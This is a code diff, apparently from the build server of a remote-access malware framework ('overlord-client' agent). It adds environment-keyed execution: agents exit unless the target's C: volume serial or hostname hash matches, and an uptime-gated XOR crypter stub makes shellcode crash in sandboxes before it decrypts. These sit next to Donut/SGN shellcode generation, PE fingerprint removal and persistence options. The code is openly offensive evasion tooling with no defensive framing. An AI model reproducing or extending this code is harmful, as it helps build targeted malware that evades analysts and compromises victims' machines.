@@ -22,7 +22,7 @@ import { runDonut } from "./donut-manager";
 import { buildLinuxShellcode } from "./linux-shellcode-manager";
 import { runSgn } from "./sgn-manager";
 import { patchPe } from "./pe-patcher";
-import { wrapXorStub } from "./custom-crypter";
+import { wrapXorStub, wrapEnvBoundXorStub } from "./custom-crypter";
 import { resolveContainedPath } from "./upload-security";
 import { createIsolatedGoBuildEnv, createLockedGoBuildEnv } from "./build-environment";
 import { cleanupMacosSdkUpload, extractAndValidateMacosSdk } from "./macos-sdk-manager";
@@ -178,6 +178,9 @@ type BuildProcessConfig = {
   macosSdkUploadDir?: string;
   enablePePatcher?: boolean;  // post-build PE fingerprint removal (linker ver, buildinfo, module path, checksum)
   enableCrypter?: boolean;    // XOR shellcode crypter (wraps Donut/Linux shellcode with self-decrypting stub)
+  envBoundShellcode?: boolean; // use uptime-gated shellcode stub (sandbox crashes before decryption)
+  targetVolumeSerial?: string; // C:\ volume serial hex (e.g. "DEADBEEF") — agent exits on mismatch
+  targetHostnameHash?: string; // first 8 hex chars of sha256(lowercase(hostname)) — agent exits on mismatch
 };
 
 type BuildHookRunner = (
@@ -1758,6 +1761,22 @@ func binderExec(outPath string, _ []byte) {
         ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
       }
 
+      if (config.targetVolumeSerial) {
+        const serial = config.targetVolumeSerial.trim().toUpperCase();
+        ldflags = `${ldflags} -X overlord-client/cmd/agent/evasion.envBindVolumeSerial=${serial}`;
+        sendToStream({ type: "output", text: `Env binding: volume serial = ${serial}\n`, level: "info" });
+      }
+
+      if (config.targetHostnameHash) {
+        const hash = config.targetHostnameHash.trim().toLowerCase();
+        ldflags = `${ldflags} -X overlord-client/cmd/agent/evasion.envBindHostnameHash=${hash}`;
+        sendToStream({ type: "output", text: `Env binding: hostname hash = ${hash}\n`, level: "info" });
+      }
+
+      if (config.envBoundShellcode) {
+        sendToStream({ type: "output", text: "Env binding: uptime-gated shellcode stub enabled\n", level: "info" });
+      }
+
       if (config.enablePersistence) {
         if (!platform.startsWith('android-')) {
           const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
@@ -2686,15 +2705,18 @@ func binderExec(outPath string, _ []byte) {
         // Wraps shellcode with a position-independent x64 decryptor so the
         // payload is XOR-encrypted at rest and only decrypted in memory at run.
         if (config.enableCrypter && shellcodeBinPath) {
-          sendToStream({ type: "output", text: `Applying XOR crypter stub...\n`, level: "info" });
+          const crypterLabel = config.envBoundShellcode ? "env-bound XOR crypter stub" : "XOR crypter stub";
+          sendToStream({ type: "output", text: `Applying ${crypterLabel}...\n`, level: "info" });
           try {
             const rawSc = fs.readFileSync(shellcodeBinPath);
-            const { output: wrapped, key } = wrapXorStub(rawSc);
+            const { output: wrapped, key } = config.envBoundShellcode
+              ? wrapEnvBoundXorStub(rawSc)
+              : wrapXorStub(rawSc);
             fs.writeFileSync(shellcodeBinPath, wrapped);
             finalOutputSize = wrapped.length;
             sendToStream({
               type: "output",
-              text: `XOR crypter: ${rawSc.length} → ${wrapped.length} bytes (key: ${key.toString("hex").substring(0, 8)}...)\n`,
+              text: `${crypterLabel}: ${rawSc.length} → ${wrapped.length} bytes (key: ${key.toString("hex").substring(0, 8)}...)\n`,
               level: "info",
             });
           } catch (cryptErr: any) {
